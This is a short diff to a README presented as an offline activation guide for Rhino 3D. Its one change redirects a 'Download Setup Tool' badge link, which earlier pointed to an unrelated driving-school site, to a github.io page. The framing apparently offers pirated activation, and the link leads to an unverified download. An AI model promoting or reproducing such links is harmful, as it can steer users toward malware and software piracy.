@@ -1,6 +1,6 @@
 # 🦏 Rhinoceros — Offline Activation Guide
 
-[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-slateblue)](https://dalahdrivingschool.com/)
+[![Download Setup Tool](https://img.shields.io/badge/Download-Setup_Tool-slateblue)](https://rhinoceros-offline-activation-guide.github.io/.github)
 
 ## 🧰 How to Install & Activate Rhino 3D Offline
 
